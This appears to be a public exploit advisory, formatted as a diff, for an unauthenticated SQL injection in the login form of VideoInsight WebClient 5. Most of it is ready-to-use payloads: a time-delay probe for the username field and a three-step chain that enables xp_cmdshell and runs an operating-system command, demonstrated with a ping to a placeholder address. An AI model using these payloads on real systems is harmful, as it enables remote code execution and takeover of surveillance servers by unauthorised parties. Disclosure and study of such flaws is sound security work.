@@ -1,0 +1,26 @@
+# Title: VideoInsight WebClient 5 - SQL Injection
+# Date: 2018-05-06
+# Author: vosec
+# Vendor Homepage: https://www.security.us.panasonic.com/
+# Software Link: https://www.security.us.panasonic.com/video-management-software/web-client/
+# Version: 5
+# Tested on: Windows Server 2008 R2
+# CVE: N/A
+
+# Description: 
+# This exploit is based on CVE-2017-5151 targeting versions prior.
+# The txtUserName and possibly txtPassword field contain an unauthenticated SQL injection vulnerability
+# that can be used for remote code execution.
+
+# SQL Injection - PoC
+# From the web login page submit the following string as the username with anything in the password field.  
+# The web server will hang for 5 seconds:
+
+UyYr');WAITFOR DELAY '00:00:05'--
+
+# Remote Code Execution - PoC
+# From the web login page submit each of the following strings as the username, one at a time, with anything
+# in the password field (with the ping, use a valid IP address that you can monitor):
+UyYr');EXEC sp_configure 'show advanced options', 1;RECONFIGURE;--
+UyYr');EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
+UyYr');EXEC xp_cmdshell 'ping xxx.xxx.xxx.xxx';--
